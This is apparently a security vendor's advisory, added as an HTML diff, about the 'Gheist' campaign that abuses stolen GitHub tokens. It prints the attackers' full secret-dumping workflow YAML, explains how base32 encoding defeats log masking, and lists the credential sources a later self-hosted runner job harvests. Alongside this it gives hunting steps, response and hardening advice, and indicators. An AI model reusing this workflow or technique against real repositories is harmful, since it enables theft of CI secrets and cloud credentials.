@@ -1,0 +1,85 @@
+<p>Since September 15, 2026, Wiz Research has been tracking Gheist: a new campaign performing mass abuse of compromised GitHub tokens. The attack commits a workflow named <code>sync-check</code> to every repository to which each token has access. The workflow seeks to print the repository's secrets into its own workflow log. Then, the tool downloads the log through the GitHub API and deletes the run seconds later. The tool's API requests carry the user agent <code>gheist</code>, which gives the campaign its name.</p>
+<p>We have recovered more than 13,500 planted branches from more than 850 compromised accounts, ranging from personal projects to enterprise organizations' private repositories.</p>
+<p>A recent GitHub control has been blocking the exploitation in public repositories, but we've observed successful exploitation and follow-on activity in private repositories and GitHub enterprise environments.</p>
+<p>As of October 24:</p>
+<ol>
+ <li>the attack is ongoing and evolving</li>
+ <li>roughly ⅔ of implicated accounts are no longer available on GitHub. This likely indicates response activity, as we have reported this activity to GitHub.</li>
+</ol>
+<h2>How the attack works</h2>
+<p>For each repository, the tool creates a branch named <code>ci-sync-</code> plus six random characters, then commits <code>.github/workflows/sync-check.yml</code> with the message <code>ci: sync config</code>. The commit is unsigned and authored as the token's owner. The push event triggers the workflow:</p>
+<pre><code>name: sync-check
+on: [push]
+permissions: \{}
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: build
+        run: |
+          env | base32 -w 120
+          echo -n '$\{\{ toJSON(secrets) }}' | base32 -w 120</code></pre>
+<p>Three details make it work:</p>
+<ul>
+ <li>GitHub masks secret values in logs only when they appear verbatim. A base32-encoded secret doesn't match, so it prints in full.</li>
+ <li>While <code>permissions: \{}</code> restricts the job's <code>GITHUB_TOKEN</code>, which the attacker doesn't need, it doesn't restrict the secrets context.</li>
+ <li>When a repository has deployment environments, the tool lists them in a job matrix with <code>environment: $\{\{ matrix.environment }}</code>, so environment-scoped secrets, often production credentials, are printed too.</li>
+</ul>
+<p>Because the secrets leave through GitHub's own API, there is no attacker domain or outbound connection to block.</p>
+<p>In enterprise organizations, we saw the tool cycle through tokens of several users and automation accounts within minutes, clone private repositories before planting the workflow, and hours later, cloud credentials from the same organization used to enumerate AWS Secrets Manager.</p>
+<h2>How the payload evolved</h2>
+<p>Two variants of this attack have been observed in parallel. They can be distinguished via the branch names.</p>
+<p><strong>Tool A</strong> uses a hexadecimal suffix and the plain payload.</p>
+<p><strong>Tool B</strong> uses a base36 suffix, added <code>timeout-minutes: 6</code> and the environment matrix within hours of its first run on September 28, and modifies the selected payload per repository.</p>
+<p>On October 19, Tool B added <code>echo X | base32 -w 120</code> between the dumps, which prints <code>LAFA====</code> as a separator, likely for the operator's log parser. Hours later it pushed a second job, <code>sync-host</code>, with <code>runs-on: self-hosted</code>, apparently only to repositories with a registered self-hosted runner. It writes three helper files (<code>.gdmp_pat</code>, <code>.gdmp_patg</code>, <code>.gdmp_sweep</code>) and logs each stage under a <code>===== gdmp-pivot: &lt;stage&gt; ===== header</code>:</p>
+<ol>
+ <li>Host details and crontab.</li>
+ <li>A recursive search of the home directory, workspace and system paths for 31 token formats (including keys for AI providers such as Anthropic, Hugging Face, Groq and NVIDIA), private keys, <code>.env</code> files, Terraform state and shell history.</li>
+ <li>The environment of every process, from <code>/proc/*/environ</code>.</li>
+ <li>Through the Docker socket, a container with the host's root filesystem mounted, to repeat the search on the host.</li>
+ <li>AWS instance-role credentials, plus GCP and Azure metadata.</li>
+ <li>GitHub Actions and GitLab runner credential files.</li>
+ <li>The Kubernetes service account token.</li>
+</ol>
+<p>However, this job is buggy: it looks for the wrong runner key file, its URL-credential regex is broken, and it doesn't collect GCP or Azure tokens.</p>
+<h2>GitHub's approval hold and private repositories</h2>
+<p>Since July 28, 2026, GitHub has held potentially malicious workflow runs in public repositories until a collaborator approves them. Every public Gheist run we checked, across all variants including the self-hosted job, sits at action_required. <strong>The control worked, and the malicious payloads never ran.</strong></p>
+<p>Unfortunately, that hold doesn't apply to private repositories or GitHub Enterprise Server. There, GitHub audit logs show runs on <code>ci-sync-*</code> branches completing and then being deleted by the <code>gheist</code> user agent. CloudTrail shows the organizations' own workflows running on those branches and assuming AWS roles, which proves Actions executed without approval.</p>
+<p>For defenders, that last signal finds Gheist without any GitHub logs, as shown below.</p>
+<h2>Other activity on the same accounts</h2>
+<p>This campaign is leveraging compromised GitHub access. The same accounts are used by other actors and campaigns, which demonstrates how compromised credentials can move throughout the threat actor ecosystem. We've observed overlaps with the following campaigns:</p>
+<ul>
+ <li><strong>Lure repositories (malware distribution).</strong> On October 6, 391 accounts renamed about 1,461 repositories to cracked-software lures like fl-studio-crack and solana-sniper-lite. The rename wiped 610 <code>ci-sync</code> branches as a side effect. 166 of these accounts never appear in Gheist activity, so the pool is larger than Gheist's footprint.</li>
+ <li><strong>Free compute.</strong> On October 18, 25 Gheist accounts each created a "Windows RDP Runner" repository within nine minutes, attempting to abuse GitHub Actions for free compute cycles.</li>
+ <li><strong>PolinRider.</strong> Some victims appear to be infected with PolinRider, the DPRK-linked malware that hides JavaScript in build config files and force-pushes back-dated commits. On October 19 and 20, three victims re-pushed their Gheist commits with a loader appended to <code>vite.config.js</code> behind hundreds of whitespace characters, and in two cases an api.js that package.json runs before every dev and build.</li>
+ <li><strong>Megalodon.</strong> 57 accounts from Gheist's first phase were also victims of Megalodon in May.</li>
+</ul>
+<p>The credential sources we could trace fit this picture: infostealer logs, and tokens exposed in earlier supply-chain compromises such as the Trivy compromise in March.</p>
+<p>Note: Gheist is distinct from GhostAction, which uses different workflow files and exfiltrates secrets to 193.32.204[.]199.</p>
+<h2>Which actions should security teams take?</h2>
+<p><strong>Hunt</strong></p>
+<ul>
+ <li>Look for branches named <code>ci-sync-</code> followed by six random characters, where the only change is a new file at <code>.github/workflows/sync-check.yml</code> with the commit message <code>ci: sync config</code>.</li>
+ <li>In GitHub audit logs, look for workflow runs on <code>ci-sync-*</code> branches that were deleted within a minute of completing, and for any activity from the user agent <code>gheist</code>.</li>
+ <li>If your workflows authenticate to the cloud with OIDC, check cloud audit logs for role assumptions or token exchanges whose subject includes a <code>ci-sync-</code> branch. That shows GitHub Actions ran on an attacker branch, even if you don't collect GitHub logs.</li>
+ <li>On self-hosted runners, look for the files <code>.gdmp_pat</code>, <code>.gdmp_patg</code> and <code>.gdmp_sweep</code>, and the string <code>gdmp-pivot</code> in job logs.</li>
+</ul>
+<p><strong>Respond</strong></p>
+<ul>
+ <li>Rotate every repository, organization and environment secret available to an affected repository. Deleting the run or the branch doesn't undo the exposure.</li>
+ <li>Revoke the tokens that pushed the commits, and check their owners' devices for infostealers.</li>
+ <li>If a <code>ci-sync</code> branch ran on a self-hosted runner, treat the host and its instance role as compromised.</li>
+ <li>Don't approve held <code>sync-check</code> runs, and don't run code from <code>ci-sync</code> branches.</li>
+</ul>
+<p><strong>Harden.</strong> Require reviewers on environments with production secrets, scope OIDC trust policies to protected branches or environments, use GitHub Apps or short-lived fine-grained tokens instead of personal access tokens, and run self-hosted runners as ephemeral hosts without Docker socket or unrestricted metadata access.</p>
+<h2>Indicators of compromise</h2>
+<ul>
+ <li>User agent <code>gheist</code></li>
+ <li>Branch <code>ci-sync-</code> followed by six characters, matching <code>^ci-sync-[0-9a-z]\{6}$</code></li>
+ <li>Commit message <code>ci: sync config</code> adding only <code>.github/workflows/sync-check.yml</code></li>
+ <li>Markers <code>toJSON(secrets) }}' | base32 -w 120</code> and <code>===== gdmp-pivot:</code>; files <code>.gdmp_pat</code>, <code>.gdmp_patg</code>, <code>.gdmp_sweep</code></li>
+ <li>Workflow blob SHAs: <code>f3da2b8b357dcda02fd455d314be2a95007516a6</code> (plain), <code>d09535857a741bbb976bdc084a9a021713133291</code> (timeout), <code>1dc5af9cce950aad1eb1546ecce8565b117540c4</code> (separator), <code>c665b778b2d822453293003e7ca0bbb2cb08e39d</code> (self-hosted job). Environment-matrix variants differ per repository.</li>
+</ul>
+<h2>How can Wiz help?</h2>
+<p>The Threat Center advisory includes an Event Explorer query covering planted commits, Gheist activity in GitHub audit logs and cloud role assumptions from attacker branches. Wiz Defend detects the activity with rules including "New Workflow Completed And Deleted In Short Time Span", "Workflow Pushed With Secret Dump" and "Commit Created With Known Malicious Commit Message".</p>
